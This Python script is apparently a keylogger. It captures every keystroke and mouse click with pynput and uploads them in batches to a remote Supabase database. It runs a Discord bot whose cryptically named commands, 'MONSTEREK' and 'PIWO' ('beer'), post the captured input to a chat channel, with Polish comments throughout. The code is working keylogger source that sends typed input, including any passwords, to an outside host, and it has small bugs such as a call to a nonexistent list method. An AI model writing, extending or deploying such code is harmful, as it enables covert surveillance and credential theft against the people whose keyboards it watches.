import os
from time import sleep

import discord
from discord.ext import commands
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener, Key
from supabase import create_client, Client
from dotenv import load_dotenv

#tes
load_dotenv()
url = "https://gurjbecyjphjhrhihnwv.supabase.co"
key = os.getenv("SP_API_KEY")
supabase: Client = create_client(url, key)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

keys = []
mouse = []

def on_press(key):
    try:
        print("Key pressed: {0}".format(key))
        keys.append(str(key))
        
        if len(keys) >= 10:
            response = (
                supabase.table("Keys")
                .insert({"buttons": keys})
                .execute()
                )
            keys.clear()
            
        if key == Key.f9:
            keys.clean()
            mouse.clean()
            mouse_listener.stop()
            keyboard_listener.stop()
            
    except Exception:
        mouse_listener.stop()
        keyboard_listener.stop()


    
def on_click(x, y, button, pressed):
    print(x, y, button, pressed)
    if pressed:
        print('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
    else:
        print('Mouse released at ({0}, {1}) with {2}'.format(x, y, button))
    mouse.append({"x": x, "y": y, "Button": button, "Pressed": pressed})
    if len(mouse) >= 10:
        response = (
            supabase.table("Mouse")
            .insert({"Data": str(mouse)})
            .execute()
            )
        mouse.clear()
        
@bot.event
async def on_ready():
    print(f'Zalogowano jako {bot.user}')

@bot.command(name='MONSTEREK')
async def fetch_users(ctx):
    # Pobieranie danych z Supabase
    response = supabase.table("Mouse").select("*").execute()
    keys = response.data

    if not keys:
        await ctx.send("Brak paliwa ;-;")
        return

    # Przygotowanie wiadomości
    message = "**Jedyne monsterki jaki były:**\n"
    messages_to_send = []  # lista wiadomości do wysłania

    for key in keys:
        create = key.get("created_at", "Brak daty")
        click = key.get("Data", "Brak przycisku")
        line = f"- {create}, {click}\n"

        # Jeśli nowa linijka spowoduje przekroczenie limitu
        if len(message) + len(line) > 2000:
            messages_to_send.append(message)
            message = ""  # zacznij nową wiadomość

        message += line

    # Dodaj ostatnią wiadomość (jeśli coś zostało)
    if message:
        messages_to_send.append(message)

    # Wysyłanie wszystkich wiadomości
    for msg in messages_to_send:
        await ctx.send(msg)

@bot.command(name='PIWO')
async def fetch_users(ctx):
    # Pobieranie danych z Supabase
    response = supabase.table("Keys").select("*").execute()
    keys = response.data

    if not keys:
        await ctx.send("Brak piwa ;-;")
        return

    # Przygotowanie wiadomości
    message = "**Jedyne piwo jakie było::**\n"
    messages_to_send = []  # lista wiadomości do wysłania

    for key in keys:
        create = key.get("created_at", "Brak daty")
        click = key.get("buttons", "Brak przycisku")
        line = f"- {create}, {click}\n"

        # Jeśli nowa linijka spowoduje przekroczenie limitu
        if len(message) + len(line) > 2000:
            messages_to_send.append(message)
            message = ""  # zacznij nową wiadomość

        message += line

    # Dodaj ostatnią wiadomość (jeśli coś zostało)
    if message:
        messages_to_send.append(message)

    # Wysyłanie wszystkich wiadomości
    for msg in messages_to_send:
        await ctx.send(msg)

Token = os.getenv("DC_API_KEY")
keyboard_listener = KeyboardListener(on_press=on_press)
mouse_listener = MouseListener(on_click=on_click)


keyboard_listener.start()
mouse_listener.start()

bot.run(Token)

keyboard_listener.join()
mouse_listener.join()
